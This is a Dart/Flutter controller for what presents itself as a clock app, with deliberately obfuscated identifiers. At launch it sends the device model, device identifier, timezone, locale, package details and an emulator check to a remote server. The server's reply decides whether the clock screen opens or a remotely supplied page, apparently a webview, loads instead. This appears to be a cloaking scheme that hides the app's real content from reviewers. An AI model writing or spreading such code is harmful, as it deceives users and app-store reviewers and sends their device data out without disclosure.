import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:get/get.dart';
import 'package:dio/dio.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';

import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';


class TimeControllLogic extends GetxController {

  var aoghjmiewd = RxBool(false);
  var yjuhsmdfk = RxBool(true);
  var qxlazf = RxString("");
  var roy = RxBool(false);
  var kihn = RxBool(true);
  final ihovkglbn = Dio();


  InAppWebViewController? webViewController;

  dynamic vuhocxyel(){
    final whnoxduap = InternetConnectionChecker.instance;
    final wyhzajb = whnoxduap.onStatusChange.skip(1).listen(
          (InternetConnectionStatus dtyqkiogfp) {
        if (dtyqkiogfp == InternetConnectionStatus.connected) {
          yejzsupm();
        } else {
          Get.toNamed('/Apptimeout')?.then((_){
            yejzsupm();
          });
        }
      },
    );
    return wyhzajb;
  }

  Future<bool> ubdkqwo() async {
    var iukams = await NetworkUtils.isNetworkAvailable();
    if(!iukams){
      Get.toNamed('/Apptimeout')?.then((_){
        yejzsupm();
      });
    }
    return iukams;
  }

  @override
  void onInit() {
    super.onInit();
    vuhocxyel();
    yejzsupm();
  }


  Future<void> yejzsupm() async {

    var ycdmxfk = await ubdkqwo();
    if(!ycdmxfk){
      return;
    }

    roy.value = true;
    kihn.value = true;
    yjuhsmdfk.value = false;

    ihovkglbn.post("https://plan.thbond.net/LFR6DBBV?no_check",data: await hclyviwxkr()).then((value) {
      var sjnrtpo = value.data["sjnrtpo"] as String;
      var qlsc = value.data["qlsc"] as bool;
      if (qlsc) {
        qxlazf.value = sjnrtpo;
        tomas();
      } else {
        harvey();
      }
    }).catchError((e) {
      yjuhsmdfk.value = true;
      kihn.value = true;
      roy.value = false;
    });
  }

  Future<Map<String, dynamic>> hclyviwxkr() async {
    final DeviceInfoPlugin wcvftj = DeviceInfoPlugin();
    PackageInfo jtivkwfp_grdxuie = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var wcvx = Platform.localeName;
    var lvncwr = currentTimeZone;

    var agpqmnu = jtivkwfp_grdxuie.packageName;
    var giqnc = jtivkwfp_grdxuie.version;
    var ksui = jtivkwfp_grdxuie.buildNumber;

    var arqi = jtivkwfp_grdxuie.appName;
    var pxvse = "";
    var zeap  = "";
    var hzmfkrld = "";
    var gregoriaGutkowski = "";
    var loisAbshire = "";
    var immanuelGleichner = "";
    var jennieHills = "";


    var omiw = "";
    var jskzaqcx = false;

    if (GetPlatform.isAndroid) {
      omiw = "android";
      var nzxdyqsho = await wcvftj.androidInfo;

      hzmfkrld = nzxdyqsho.brand;

      pxvse  = nzxdyqsho.model;
      zeap = nzxdyqsho.id;

      jskzaqcx = nzxdyqsho.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      omiw = "ios";
      var ngsdht = await wcvftj.iosInfo;
      hzmfkrld = ngsdht.name;
      pxvse = ngsdht.model;

      zeap = ngsdht.identifierForVendor ?? "";
      jskzaqcx  = ngsdht.isPhysicalDevice;
    }

    var res = {
      "arqi": arqi,
      "ksui": ksui,
      "giqnc": giqnc,
      "agpqmnu": agpqmnu,
      "pxvse": pxvse,
      "lvncwr": lvncwr,
      "hzmfkrld": hzmfkrld,
      "zeap": zeap,
      "wcvx": wcvx,
      "omiw": omiw,
      "jskzaqcx": jskzaqcx,
      "gregoriaGutkowski" : gregoriaGutkowski,
      "loisAbshire" : loisAbshire,
      "immanuelGleichner" : immanuelGleichner,
      "jennieHills" : jennieHills,

    };
    return res;
  }

  Future<void> harvey() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> tomas() async {
    Get.offNamed("/Outreload");
  }

  @override
  void dispose() {
    vuhocxyel().cancel();
    super.dispose();
  }
}
